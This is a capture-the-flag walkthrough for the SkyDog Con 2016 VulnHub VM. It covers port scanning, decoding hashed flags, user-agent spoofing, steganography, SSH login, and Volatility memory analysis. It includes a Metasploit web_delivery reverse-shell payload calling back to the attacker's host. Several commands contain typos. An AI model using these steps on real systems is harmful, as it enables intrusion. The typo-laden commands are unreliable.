@@ -1,0 +1,102 @@
+
+Hack the SkyDog Con CTF 2016 – Catch Me If You Can VM
+
+SkyDog is the second VM in CTF Root2Boot series created by James Brower. It is configured with DHCP so the IP will be given to it automatically. This VM is based on Catch me if you can which is movie about Frank who is conman. So it is correct to assume that a broad OSINT concept will be used in it. This is an amazing VM as it uses about hacking and forensic skills. The author of this VM has given us hints about all the eight flags as below :
+Flag #1 : Don’t go Home Frank! There’s a Hex on Your House.
+Flag #2 : Obscurity or Security?
+Flag #3 : Be Careful Agent, Frank Has Been Known to Intercept Traffic Our Traffic.
+Flag #4 : A Good Agent is Hard to Find.
+Flag #5 : The Devil is in the Details – Or is it Dialogue? Either Way, if it’s Simple, Guessable, or Personal it Goes Against Best Practices
+Flag #6 :  Where in the World is Frank?
+Flag #7 : Frank Was Caught on Camera Cashing Checks and Yelling – I’m The Fastest Man Alive!
+Flag #8 : Franks Lost His Mind or Maybe it’s His Memory. He’s Locked Himself Inside the Building. Find the Code to Unlock the Door Before He Gets Himself Killed!
+Except this we know that the flags are in MD5 Hash. You can download it from : https://www.vulnhub.com/entry/skydog-2016-catch-me-if-you-can,166/. 
+WalkThrough
+Let us find our target first.
+netdiscover
+
+Now that we know our target is 192.168.1.27. Let’s fire up nmap scan.
+nmap –p- -A 192.168.1.27
+
+Nmap shows that four ports are opened which are : 22, 80, 443, 22222 with the services of SSH(closed), HTTP, HTTPS, SSH(open).
+The port 80 is opened as well as 443 so let’s open our target in browser and see what we can find there.
+
+There was nothing on the webpage except the information on the lab so I visited it page source.
+
+In the page source there was a directy /oldie/html5.js. I opened it and found the page very confusing but then I looked at the first flag’s hint i.e. Flag #1 : Don’t go Home Frank! There’s a Hex on Your House. And then it clicked me in the hint says something about hex and so the first line is our first flag but in hex.
+
+So I copied it and paste it to the asciitohex.com. And it will decode the hex and you will have the first flag in MD5 hash value.
+
+Use the online webpage to crack the MD5 code like we have done in the following image :
+
+Our first flag is nmap as we already know that this is hint for next flag that means our next flag is related to nmap. So I looked closely to all ports and then I decided to open SSH which was opened on 22222 port.
+
+And yes! We have found our second flag. Let’s crack it with hash value.
+
+Our second flag is encrypt that means our third flag is related to encryption. Let’s check the hint given for the third flag. Flag #3 : Be Careful Agent, Frank Has Been Known to Intercept Traffic Our Traffic.  Now in the hint it says something intercepting the traffic. Now intercepting the traffic is related to SLL certificate. To check the certificate click on the logo of Secure Connection. And then click on the arrow for the next menu.
+
+From the drop down menu then appears select More Information tab.
+
+It will open a dialogue box just like on as shown below :
+
+From this dialogue box, select security tab and then click on View Certificate button. In the certificate you will find the third flag.
+
+Again crack it through MD5 cracker.
+
+So our third flag seems to be personnel. This personnel could be a directory so open it in the browser.
+
+When we open the personnel directory, it says that access is denied. That means there is a log in portal somewhere here to which our access is denied. So I went back to the previous directory that we had found and explored a bit there and I found there that the FBI workstations work on MIE 4.0. that means there was a problem of browser.
+
+Now I could not find any User Agent which had an MIE 4.0 so I decided to use BurpSuite. I captured it cookies.
+
+In the cookies you can see that the browser used is Linux x86_64. I changed to MSIE 4.0 as shown below :
+
+And then when I forwarded through BurpSuite, thus, the page opened in the browser giving us our Fourth flag.
+
+Now decode this flag’s value and add ‘new’ to it.
+
+Upon cracking our flag is evidence, and by adding new to it our forth flag becomes – new evidence. Now this again could be a directly like the previous flags. Open it in browser. 
+
+And yes!! We have log in portal. Here, for the username and the password I figured OSINT must have been used. So I gathered every information about the movie I could and I even watched the movie. For the whole two days I searched and searched But alas! I found nothing. And then I referred to the author’s walkthrough and got the username and password that is carl.hanratty and Grace respectively.
+Now upon log in the newevidence directory opens.
+
+There was nothing on the page so looked on to the page source.
+
+In the page source we found three directories from which invoice.pdf proved to be useless. LOL! But not to worry we have other two directories. Lets open Evidence.txt.
+
+And yes! We have found our fifth flag. Upon cracking the MD5 value, the flag is panam. Five flags down, four to go.
+
+Now let’s have a look on the other directory that we had found.
+
+Save this image. I tried to read this image through exiftool but it did not work. So I tried steghide.
+steghide extract –sf image.jpg
+
+We have got our sixth flag now which is ILoveFrance. You can decode this flag’s MD5 value but it will still give ILoveFrance. And we also have a clue i.e. iheartbrenda. This flag and clue are both important, make its note.
+For our seventh flag we have the hint — Flag #7 : Frank Was Caught on Camera Cashing Checks and Yelling – I’m The Fastest Man Alive! In this hint it says “I am the fastest man alive” this is the pet dialogue of The Flash. And even in the movie Frank uses a fake name Barry Allen.
+
+This can be our username. Lets log in through SSH port using bary allen username. When it asked for password I tried both ILoveFrance and iheartbrenda and fortunately iheartbrenda was the correct password.
+
+To have root’s access we used web_delivery exploit. We made that exploit using python script. To do so open metasploit by typing msfconsole in thr terminal of kali and then further type :
+use exploit/multi/script/web_delivery
+set target 0
+set payload python/mertrepreter/reverse_tcp
+set lhost 192.168.1.21
+set lport 4444
+exploit
+
+It will create a code. Copy that code and paste it on the terminal.
+
+As soon as you will hit enter, a mterpreter session will open and then type:
+session –I 1
+pwd
+ls
+
+It will show a flag.txt but it will not be considered as our last flag as this is not in the form of MD5 hash as it was instructed by the created.
+
+I explored here a lot and then I download security-system.data.zip as I had a instinct that this could be useful. This was a RAM file. I read it using volatility software. For this type :
+volatility-2.3.1.standalone.exe –f security-system.data.zip imageinfo
+
+volatility-2.3.1.standalone.exe –f security-system.data.zip –profile=WinXPSP2x86 consoles
+
+And we have captured our last flag. HURRAAYYYYY!!!!!! All the flags have been captured. Enjoy!
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here.
